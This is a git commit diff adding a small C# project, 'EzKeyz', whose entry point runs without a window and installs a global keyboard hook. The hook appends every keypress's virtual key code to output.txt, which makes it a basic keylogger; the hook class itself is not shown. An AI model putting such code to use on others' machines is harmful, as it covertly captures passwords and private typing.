ea3a10234f1548e792ef872d0fb170ba6f9db09b
reed <reed@GAME-SERVER>
2024-08-31 15:44:02 -0400

    Add project files.

---
+++ EzKeyz/GlobalKeyboardHookEventArgs.cs
@@ -0,0 +1,21 @@
+﻿using System.ComponentModel;
+
+namespace ASPMProductionStation.Models
+{
+    class GlobalKeyboardHookEventArgs : HandledEventArgs
+    {
+
+        public GlobalKeyboardHookEventArgs(
+            GlobalKeyboardHook.LowLevelKeyboardInputEvent keyboardData,
+            GlobalKeyboardHook.KeyboardState keyboardState)
+        {
+            KeyboardData = keyboardData;
+            KeyboardState = keyboardState;
+        }
+
+        #region Properties
+        public GlobalKeyboardHook.LowLevelKeyboardInputEvent KeyboardData { get; private set; }
+        public GlobalKeyboardHook.KeyboardState KeyboardState { get; private set; }
+        #endregion
+    }
+}
---
+++ EzKeyz/Program.cs
@@ -0,0 +1,34 @@
+﻿using ASPMProductionStation.Models;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace EzKeyz
+{
+    internal static class Program
+    {
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+
+            GlobalKeyboardHook _globalKeyboardHook = new GlobalKeyboardHook();
+            _globalKeyboardHook.KeyboardPressed += OnGlobalKeyboardHook_KeyboardPressed;
+            Application.Run();
+        }
+
+        private static void OnGlobalKeyboardHook_KeyboardPressed(object sender, GlobalKeyboardHookEventArgs e)
+        {
+            //Debug.WriteLine(e.KeyboardData.VirtualCode);
+            File.AppendAllText("output.txt", $"{e.KeyboardData.VirtualCode}\r\n");
+        }
+    }
+}
